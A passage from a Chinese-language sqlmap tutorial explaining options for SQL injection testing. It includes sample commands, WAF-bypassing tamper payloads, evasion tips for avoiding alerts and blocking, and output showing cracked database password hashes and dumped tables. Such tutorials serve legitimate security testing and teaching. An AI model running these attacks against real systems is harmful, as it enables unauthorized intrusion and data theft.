</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>HTTP cookie头</strong></p><p>参数：<code>–cookie,–load-cookies,–drop-set-cookie</code></p><p>这个参数在以下两个方面很有用：</p><ol><li>web应用需要登陆的时候。</li><li>你想要在这些头参数中测试SQL注入时。</li></ol><p>可以通过抓包把<code>cookie</code>获取到，复制出来，然后加到<code>–cookie</code>参数里。</p><p>在<code>HTTP</code>请求中，遇到<code>Set-Cookie</code>的话，<code>sqlmap</code>会自动获取并且在以后的请求中加入，并且会尝试<code>SQL</code>注入。</p><p>如果你不想接受<code>Set-Cookie</code>可以使用<code>–drop-set-cookie</code>参数来拒接。</p><p>当你使用<code>–cookie</code>参数时，当返回一个<code>Set-Cookie</code>头的时候，<code>sqlmap</code>会询问你用哪个<code>cookie</code>来继续接下来的请求。</p><p>当<code>–level</code>的参数设定为2或者2以上的时候，<code>sqlmap</code>会尝试注入<code>Cookie</code>参数。</p><p><strong>HTTP User-Agent头</strong></p><p>参数：<code>–user-agent,–random-agent</code></p><p>默认情况下<code>sqlmap</code>的<code>HTTP</code>请求头中<code>User-Agen</code>t值是：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>（这可能直接会被过滤掉或是触发警报，可以使用真实浏览器的<code>useragent</code>，百度一下就有了）</p><p>可以使用<code>–user-anget</code>参数来修改，同时也可以使用<code>–random-agnet</code>参数来随机的从<code>./txt/user-agents.txt</code>中获取。</p><p>当<code>–level</code>参数设定为3或者3以上的时候，会尝试对<code>User-Angent</code>进行注入。</p><p><strong>HTTP Referer头</strong></p><p>参数：<code>–referer</code></p><p><code>sqlmap</code>可以在请求中伪造HTTP中的<code>referer</code>，当<code>–level</code>参数设定为3或者3以上的时候会尝试对referer注入。</p><p><strong>额外的HTTP头</strong></p><p>参数：<code>–headers</code></p><p>可以通过<code>–headers</code>参数来增加额外的http头</p><p><strong>HTTP认证保护</strong></p><p>参数：<code>–auth-type,–auth-cred</code></p><p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. Basic

2. Digest

3. NTLM
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;
--auth-type Basic --auth-cred &quot;testuser:testpass&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>HTTP协议的证书认证</strong></p><p>参数：<code>–auth-cert</code></p><p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:<code>key_file，cert_file</code>。</p><p><code>key_file</code>是格式为PEM文件，包含着你的私钥，<code>cert_file</code>是格式为<code>PEM</code>的连接文件。</p><p><strong>HTTP(S)代理</strong></p><p>参数：<code>–proxy,–proxy-cred</code>和<code>–ignore-proxy</code></p><p>使用<code>–proxy</code>代理是格式为：<code>http://url:port。</code></p><p>当<code>HTTP(S)</code>代理需要认证是可以使用<code>–proxy-cred</code>参数：<code>username:password</code>。</p><p><code>–ignore-proxy</code>拒绝使用本地局域网的<code>HTTP(S)</code>代理。</p><p><strong>HTTP请求延迟</strong></p><p>参数：<code>–delay</code></p><p>可以设定两个<code>HTTP(S)</code>请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><p><strong>设定超时时间</strong></p><p>参数：<code>–timeout</code></p><p>可以设定一个<code>HTTP(S)</code>请求超过多久判定为超时，<code>10.5</code>表示<code>10.5</code>秒，默认是<code>30</code>秒。</p><p><strong>设定重试超时</strong></p><p>参数：<code>–retries</code></p><p>当<code>HTTP(S)</code>超时时，可以设定重新尝试连接次数，默认是3次。</p><p><strong>设定随机改变的参数值</strong></p><p>参数：<code>–randomize</code></p><p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p><p>利用正则过滤目标网址</p><p>参数：<code>**–scope**</code></p><p>例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -l burp.log --scope=&quot;(www)?\\.target\\.(com\\|net\\|org)&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>避免过多的错误请求被屏蔽</strong></p><p>参数：<code>–safe-url,–safe-freq</code></p><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p><p><strong>绕过这个策略有两种方式：</strong></p><ol><li><code>--safe-url</code>：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li><li><code>--safe-freq</code>：提供一个安全不错误的连接，一段频率后会访问一次。</li></ol><p><strong>关掉URL参数值编码</strong></p><p>参数：<code>–skip-urlencode</code></p><p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过<code>URL</code>编码的值，这时候就需要用<code>–skip-urlencode</code>参数。</p><p><strong>每次请求时候执行自定义的python代码</strong></p><p>参数：<code>–eval</code></p><p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p><p>例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u
&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;
--eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面的请求就是每次请求时根据id参数值，做一次<code>md5</code>后作为<code>hash</code>参数的值。</p><h4 id="注入" tabindex="-1"><a class="header-anchor" href="#注入" aria-hidden="true">#</a> 注入</h4><p><strong>测试参数</strong></p><p>参数：<code>-p</code></p><p>如： <code>-p “id,user-anget”</code></p><p><strong>指定要跳过测试的参数</strong></p><p>参数：<code>–skip</code></p><p>如：<code>–skip=”user-angent.referer”</code></p><p>对于伪静态链接，可以在想测试的参数后面加*，它会测试那个指定的参数</p><p>例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u &quot;http://targeturl/param1/value1\\*/param2/value2/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>指定数据库</strong></p><p>参数：<code>–dbms</code></p><p>不指定会自动探测，如果知道最好指定</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft
Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>指定服务器系统</strong></p><p>参数：<code>–os</code></p><p>不指定会自动探测，支持的有：<code>Linux、Windows</code>。</p><p><strong>指定无效的大数字</strong></p><p>参数：<code>–invalid-bignum</code></p><p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系<code>id=13，sqlmap</code>会变成<code>id=-13</code>来报错，你可以指定比如<code>id=9999999</code>来报错。</p><p><strong>指定无效的逻辑</strong></p><p>参数：<code>–invalid-logical</code></p><p>原因同上，可以指定<code>id=13</code>把原来的<code>id=-13</code>的报错改成<code>id=13 AND 18=19</code>。</p><p><strong>注入payload</strong></p><p>参数：<code>–prefix,–suffix</code></p><p>在有些环境中，需要在注入的<code>payload</code>的前面或者后面加一些字符，来保证<code>payload</code>的正常执行。</p><p>例如，代码中是这样调用数据库的：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这时你就需要<code>–prefix</code>和<code>–suffix</code>参数了：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix
&quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>这样执行的SQL语句变成：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’)
LIMIT 0, 1&quot;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>修改注入的数据</strong></p><p>参数：<code>–tamper</code></p><p><code>sqlmap</code>除了使用<code>CHAR()</code>函数来防止出现单引号之外没有对注入的数据修改，你可以使用<code>–tamper</code>参数对数据做修改来绕过WAF等设备。 下面是一个<code>tamper</code>脚本的格式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># Needed imports
from lib.core.enums import PRIORITY
# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL
def tamper(payload):
&#39;&#39;&#39;
Description of your tamper script
&#39;&#39;&#39;
retVal = payload
# your code to tamper the original payload
# return the tampered payload
return retVal
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以查看 <code>tamper/</code> 目录下的有哪些可用的脚本</p><p>例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3

[hh:mm:03] [DEBUG] cleaning up configuration parameters
[hh:mm:03] [INFO] loading tamper script &#39;between&#39;
[hh:mm:03] [INFO] loading tamper script &#39;randomcase&#39;
[hh:mm:03] [INFO] loading tamper script &#39;space2comment&#39;
[...]
[hh:mm:04] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
[...]
[hh:mm:04] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(
58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/
group/**/bY/**/x)a)
[hh:mm:04] [INFO] GET parameter &#39;id&#39; is &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING
clause&#39; injectable
[...]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="探测" tabindex="-1"><a class="header-anchor" href="#探测" aria-hidden="true">#</a> 探测</h4><p><strong>探测等级</strong></p><p>参数：<code>–level</code></p><p>共有五个等级，默认为<code>1，sqlmap</code>使用的<code>payload</code>可以在<code>xml/payloads.xml</code>中看到，你也可以根据相应的格式添加自己的<code>payload</code>。</p><p>这个参数不仅影响使用哪些<code>payload</code>同时也会影响测试的注入点，<code>GET</code>和<code>POST</code>的数据都会测试，<code>HTTP Cookie</code>在<code>level</code>为2的时候</p><p>就会测试，<code>HTTP User-Agent/Referer</code>头在<code>level</code>为3的时候就会测试。</p><p>总之在你不确定哪个<code>payload</code>或者参数为注入点的时候，为了保证全面性，建议使用高的<code>level</code>值。</p><p><strong>风险等级</strong></p><p>参数：<code>–risk</code></p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><p>测试的语句同样可以在<code>xml/payloads.xml</code>中找到，你也可以自行添加<code>payload</code>。</p><p><strong>页面比较</strong></p><p>参数：<code>–string,–not-string,–regexp,–code</code></p><p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，</p><p>比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，</p><p>在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），</p><p>同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。</p><p>用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。</p><p>参数：<code>–text-only,–titles</code></p><p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p><h4 id="注入技术" tabindex="-1"><a class="header-anchor" href="#注入技术" aria-hidden="true">#</a> 注入技术</h4><p><strong>测试是否是注入</strong></p><p>参数：<code>–technique</code></p><p>这个参数可以指定<code>sqlmap</code>使用的探测技术，默认情况下会测试所有的方式。</p><p>支持的探测方式如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>B: Boolean-based blind SQL injection（布尔型注入）

E: Error-based SQL injection（报错型注入）

U: UNION query SQL injection（可联合查询注入）

S: Stacked queries SQL injection（可多语句查询注入）

T: Time-based blind SQL injection（基于时间延迟注入）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>设定延迟注入的时间</strong></p><p>参数：<code>–time-sec</code></p><p>当使用继续时间的盲注时，时刻使用<code>–time-sec</code>参数设定延时时间，默认是5秒。</p><p><strong>设定UNION查询字段数</strong></p><p>参数：<code>–union-cols</code></p><p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。</p><p>设定<code>–union-cols</code>的值应该是一段整数，如：12-16，是测试12-16个字段数。</p><p><strong>设定UNION查询使用的字符</strong></p><p>参数：<code>–union-char</code></p><p>默认情况下<code>sqlmap</code>针对<code>UNION</code>查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，</p><p>这是你可以用<code>–union-char</code>只定UNION查询的字符。</p><p><strong>二阶SQL注入</strong></p><p>参数：<code>–second-order</code></p><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p><p><code>–second-order</code>后面跟一个判断页面的URL地址。</p><p><strong>列数据</strong></p><p>参数：<code>-b,–banner</code></p><p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p><p><strong>用户</strong></p><p>参数：<code>-current-user</code></p><p>在大多数据库中可以获取到管理数据的用户。</p><p><strong>当前数据库</strong></p><p>参数：<code>–current-db</code></p><p>返还当前连接的数据库。</p><p><strong>当前用户是否为管理用</strong></p><p>参数：<code>–is-dba</code></p><p>判断当前的用户是否为管理，是的话会返回True。</p><p><strong>列数据库管理用户</strong></p><p>参数：<code>–users</code></p><p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p><p><strong>列出并破解数据库用户的hash</strong></p><p>参数：<code>–passwords</code></p><p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://********/sqlmap/pgsql/get_int.php?id=1&quot; --passwords -v 1
[...]
back-end DBMS: PostgreSQL
[hh:mm:38] [INFO] fetching database users password hashes
do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
[hh:mm:42] [INFO] using hash method: &#39;postgres_passwd&#39;
what&#39;s the dictionary&#39;s location? [/software/sqlmap/txt/wordlist.txt]
[hh:mm:46] [INFO] loading dictionary from: &#39;/software/sqlmap/txt/wordlist.txt&#39;
do you want to use common password suffixes? (slow!) [y/N] n
[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
[hh:mm:49] [INFO] found: &#39;testpass&#39; for user: &#39;testuser&#39;
[hh:mm:50] [INFO] found: &#39;testpass&#39; for user: &#39;postgres&#39;
database management system users password hashes:
[*] postgres [1]:
password hash: md5d7d880f96044b72d0bba108ace96d1e4
clear-text password: testpass
[*] testuser [1]:
password hash: md599e5ea7a6f7c3269995cba3927fd0093
clear-text password: testpass
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，</p><p>这个爆破已经支持<code>Oracle</code>和<code>Microsoft SQL Server</code>。</p><p>也可以提供-U参数来指定爆破哪个用户的<code>hash</code>。</p><p><strong>列出数据库管理员权限</strong></p><p>参数：<code>–privileges</code></p><p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。</p><p>也可以用-U参数指定你想看哪个用户的权限。</p><p><strong>列出数据库管理员角色</strong></p><p>参数：<code>–roles</code></p><p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p><p>仅适用于当前数据库是<code>Oracle</code>的时候。</p><p><strong>列出数据库系统的数据库</strong></p><p>参数：<code>–dbs</code></p><p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p><p><strong>列举数据库表</strong></p><p>参数：<code>–tables,–exclude-sysdbs,-D</code></p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;http://192.168.163.138/mutillidae/index.php?page=user-info.php&amp;username=111&amp;password=12123&amp;user-info-php-submit-button=View+Account+Details&quot;
--tables -D dvwa
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p><p>–exclude-sysdbs参数是指包含了所有的系统数据库。</p><p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p><p><strong>列举数据库表中的字段</strong></p><p>参数：<code>–columns,-C,-T,-D</code></p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p><p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://*******/sqlmap/sqlite/get_int.php?id=1&quot; --columns -D testdb -T users -C name
[...]
Database: SQLite_masterdb
Table: users
[3 columns]
+---------+---------+
| Column  | Type|
+---------+---------+
| id  | INTEGER |
| name| TEXT|
| surname | TEXT|
+---------+---------+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>列举数据库系统的架构</strong></p><p>参数：<code>–schema,–exclude-sysdbs</code></p><p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p><p>加上<code>–exclude-sysdbs</code>参数，将不会获取数据库自带的系统库内容。</p><p>MySQL例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://*******/sqlmap/mysql/get_int.php?id=1&quot; --schema --batch --exclude-sysdbs
[...]
Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column  | Type|
+-------------+---------+
| cid | int(11) |
| mysignature | text|
| password| text|
| username| text|
+-------------+---------+

Database: owasp10
Table: blogs_table
[4 columns]
+--------------+----------+
| Column   | Type |
+--------------+----------+
| date | datetime |
| blogger_name | text |
| cid  | int(11)  |
| comment  | text |
+--------------+----------+

Database: owasp10
Table: hitlog
[6 columns]
+----------+----------+
| Column   | Type |
+----------+----------+
| date | datetime |
| browser  | text |
| cid  | int(11)  |
| hostname | text |
| ip   | text |
| referer  | text |
+----------+----------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type  |
+---------+---------------+
| id  | int(11)   |
| name| varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
[...]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>获取表中数据个数</strong></p><p>参数：<code>–count</code></p><p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p><p>列举一个<code>Microsoft SQL Server</code>例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot; --count -D testdb
[...]
Database: testdb
+----------------+---------+
| Table  | Entries |
+----------------+---------+
| dbo.users  | 4   |
| dbo.users_blob | 2   |
+----------------+---------+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>获取整个表的数据</strong></p><p>参数：<code>–dump,-C,-T,-D,–start,–stop,–first,–last</code></p><p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</p><p>使用<code>-D,-T</code>参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。</p><p>列举一个<code>Firebird</code>的例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot; --dump -T users
[...]
Database: Firebird_masterdb
Table: USERS
[4 entries]
+----+--------+------------+
| ID | NAME   | SURNAME|
+----+--------+------------+
| 1  | luther | blisset|
| 2  | fluffy | bunny  |
| 3  | wu | ming   |
| 4  | NULL   | nameisnull |
+----+--------+------------+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以获取指定库中的所有表的内容，只用<code>-dump</code>跟<code>-D</code>参数（不使用-T与-C参数）。</p><p>也可以用-dump跟-C获取指定的字段内容。</p><p>sqlmap为每个表生成了一个CSV文件。</p><p>如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop</p><p>1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。</p><p>也可以用<code>–first与–last</code>参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first</p><p>3:–last</p><p>4:只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><p><strong>获取所有数据库表的内容</strong></p><p>参数：<code>–dump-all,–exclude-sysdbs</code></p><p>使用<code>–dump-all</code>参数获取所有数据库表的内容，可同时加上<code>–exclude-sysdbs</code>只获取用户数据库的表，</p><p>需要注意在<code>Microsoft SQL</code><code>Server</code>中<code>master</code>数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p><p><strong>搜索字段，表，数据库</strong></p><p>参数：<code>–search,-C,-T,-D</code></p><p><code>–search</code>可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p><p>可以在一下三种情况下使用：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。

-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名

-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>运行自定义的SQL语句</strong></p><p>参数：<code>–sql-query,–sql-shell</code></p><p><code>sqlmap</code>会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p><p>如果是<code>SELECT</code>查询语句，<code>sqlap</code>将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p><p>列举一个<code>Mircrosoft SQL Server 2000</code>的例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://**********/sqlmap/mssql/get_int.php?id=1&quot;
--sql-query &quot;SELECT &#39;foo&#39;&quot; -v 1
[...]
[hh:mm:14] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;&#39;
[hh:mm:14] [INFO] retrieved: foo
SELECT &#39;foo&#39;: &#39;foo&#39;
\\$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;
--sql-query &quot;SELECT &#39;foo&#39;, &#39;bar&#39;&quot; -v 2
[...]
[hh:mm:50] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;, &#39;bar&#39;&#39;
[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now
unpack it into
distinct queries to be able to retrieve the output even if we are going blind
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS
VARCHAR(8000)),
(CHAR(32)))
[hh:mm:50] [INFO] retrieved: foo
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS
VARCHAR(8000)),
(CHAR(32)))
[hh:mm:50] [INFO] retrieved: bar
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
SELECT &#39;foo&#39;, &#39;bar&#39;: &#39;foo, bar&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="爆破" tabindex="-1"><a class="header-anchor" href="#爆破" aria-hidden="true">#</a> 爆破</h4><p><strong>暴力破解表名</strong></p><p>参数：<code>–common-tables</code></p><p>当使用<code>–tables</code>无法获取到数据库的表时，可以使用此参数。</p><p>通常是如下情况：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. \`MySQL\`数据库版本小于5.0，没有\`information_schema\`表。

2. 数据库是\`Microssoft Access\`，系统表\`MSysObjects\`是不可读的（默认）。

3. 当前用户没有权限读取系统中保存数据结构的表的权限。
